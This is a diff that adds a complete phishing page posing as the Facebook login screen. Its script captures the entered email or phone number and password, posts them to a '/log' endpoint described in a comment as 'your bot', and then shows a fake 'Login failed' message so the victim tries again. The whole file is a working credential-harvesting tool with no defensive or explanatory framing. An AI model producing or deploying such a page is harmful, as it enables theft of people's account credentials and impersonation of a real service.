@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In</title>
+    <style>
+        body { font-family: Arial; max-width: 400px; margin: 100px auto; padding: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { background: #1877f2; color: white; padding: 12px; width: 100%; border: none; }
+    </style>
+</head>
+<body>
+    <h2>Log into Facebook</h2>
+    <form id="loginForm">
+        <input type="text" placeholder="Email or phone number" id="username" required>
+        <input type="password" placeholder="Password" id="password" required>
+        <button type="submit">Log In</button>
+    </form>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Send data to your bot (simplified)
+            fetch('/log', {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({username, password, site:'facebook'})
+            });
+            
+            alert('Login failed. Please try again.');
+        });
+    </script>
+</body>
+</html>
